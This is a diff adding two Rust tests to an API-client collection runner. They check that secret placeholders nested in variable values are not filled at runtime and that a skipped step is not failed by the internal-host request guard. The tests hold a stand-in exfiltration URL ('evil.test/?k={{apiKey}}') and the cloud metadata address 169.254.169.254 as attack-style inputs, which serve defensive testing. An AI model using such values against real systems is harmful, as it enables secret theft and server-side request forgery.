@@ -1029,6 +1029,87 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn a_placeholder_inside_a_variable_value_is_not_filled_by_the_runtime_pass() {
+        let mut collection = Collection::new("my-api");
+        collection.settings.variables = vec![
+            rocket_collection::CollectionVariable {
+                key: "apiKey".into(),
+                value: "col-secret-123456".into(),
+                initial_value: String::new(),
+                enabled: true,
+                secret: true,
+            },
+            rocket_collection::CollectionVariable {
+                key: "next".into(),
+                value: "https://evil.test/?k={{apiKey}}".into(),
+                initial_value: String::new(),
+                enabled: true,
+                secret: false,
+            },
+        ];
+        collection.root.add_request(req("First", "first.yml"));
+        let mut second = req("Second", "second.yml");
+        second.url = "{{next}}&t={{TOKEN}}".into();
+        collection.root.add_request(second);
+
+        let engine = ProgrammableEngine::new();
+        engine.on(
+            "First",
+            "after-response",
+            ScriptResult {
+                runtime_vars: std::collections::HashMap::from([(
+                    "TOKEN".to_string(),
+                    serde_json::json!("abc123"),
+                )]),
+                ..Default::default()
+            },
+        );
+        let h = harness(collection, engine, RecordingExecutor::new());
+        h.runner
+            .run(&h.exec, sample_run_input())
+            .await
+            .expect("run");
+
+        // The secret named inside the value of `next` stays a literal placeholder.
+        assert_eq!(
+            h.executor.sent_urls()[1],
+            "https://evil.test/?k={{apiKey}}&t=abc123"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_skipped_step_is_not_failed_by_the_guard_on_a_runtime_url() {
+        let mut collection = Collection::new("my-api");
+        let mut step = req("First", "first.yml");
+        step.url = "{{base}}/latest/meta-data/".into();
+        collection.root.add_request(step);
+
+        let engine = ProgrammableEngine::new();
+        engine.on(
+            "First",
+            "before-request",
+            ScriptResult {
+                skip_request: true,
+                runtime_vars: std::collections::HashMap::from([(
+                    "base".to_string(),
+                    serde_json::json!("http://169.254.169.254"),
+                )]),
+                ..Default::default()
+            },
+        );
+        let h = harness(collection, engine, RecordingExecutor::new());
+        let mut input = sample_run_input();
+        input.request_guard_policy = rocket_workspace::RequestGuardPolicy {
+            block_script_redirects_to_internal_hosts: true,
+            also_block_private_ranges: false,
+        };
+        let summary = h.runner.run(&h.exec, input).await.expect("run");
+
+        assert_eq!(summary.steps[0].status, RunStepStatus::Skipped);
+        assert!(h.executor.sent_urls().is_empty());
+    }
+
+    #[tokio::test]
     async fn publishes_started_step_and_finished_events() {
         use rocket_shared::events::DomainEvent;
 
